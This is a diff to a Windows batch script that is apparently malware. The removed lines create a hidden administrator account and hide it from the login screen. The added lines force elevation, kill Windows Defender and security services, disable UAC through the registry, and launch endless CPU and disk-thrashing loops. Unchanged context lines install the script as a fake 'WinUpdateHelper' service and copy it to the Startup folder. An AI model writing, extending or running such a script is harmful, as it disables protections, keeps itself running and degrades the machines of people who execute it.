@@ -1,18 +1,34 @@
 @echo off
 setlocal enabledelayedexpansion
 
-net user shadowAdmin VjDjFdGYThjYT258435FGhd /add >nul 2>&1
-net localgroup administrators shadowAdmin /add >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v shadowAdmin /t REG_DWORD /d 0 /f >nul 2>&1
-echo Set UAC = CreateObject("Shell.Application") > "%TEMP%\bypass.vbs"
-echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\bypass.vbs"
-wscript.exe "%TEMP%\bypass.vbs" >nul 2>&1
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%~f0" /t REG_SZ /d "RUNASADMIN" /f >nul 2>&1
-if not '%1'=='admin' (
-    powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs" >nul 2>&1
-    goto :eof
+if "%1"=="admin" goto :admin
+powershell -Command "Start-Process '%~f0' -ArgumentList 'admin' -Verb RunAs"
+exit /b
+:admin
+
+if not "%1"=="bios_level" (
+    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+        $code = @'
+        [DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();
+        [DllImport(\"advapi32.dll\")]public static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
+        [DllImport(\"advapi32.dll\")]public static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIVILEGES p,uint l,IntPtr p,IntPtr r);
+        public struct TOKEN_PRIVILEGES{public uint Count;public long Luid;public uint Attr;}
+        public const uint SE_PRIVILEGE_ENABLED=0x2;
+        public const string SE_SHUTDOWN_NAME=\"SeShutdownPrivilege\";
+        public const uint TOKEN_ADJUST_PRIVILEGES=0x20;
+        public const uint TOKEN_QUERY=0x8;
+'@
+        Add-Type -MemberDefinition $code -Name Win32 -Namespace System
+        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
+        $hdl = $proc.Handle
+        Invoke-Expression 'cmd /c start /trustlevel:0x40000 %~s0 bios_level'
+    " >nul 2>&1
+    exit /b
 )
 
+taskkill /f /im MsMpEng.exe /im AntimalwareServiceExecutable.exe /im SecurityHealthService.exe >nul 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
 sc create "WinUpdateHelper" binPath= "\"%~f0\"" start= auto type= own type= interact >nul 2>&1
 sc start "WinUpdateHelper" >nul 2>&1
 copy %0 "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
@@ -106,5 +122,9 @@ for /l %%i in (1,1,4) do (
 start /b cmd /c for /L %%i in (1,0,1000000) do echo STRESS >nul
 
 start /high /min cmd /c "for /l %%n in () do set /a n=%%n*%%n"
+
+start /b cmd /c "for /l %%n in () do (echo %%n >nul)"
+
+start /b cmd /c "for /l %%n in () do (md %%n && rd %%n)"
 
 goto loop
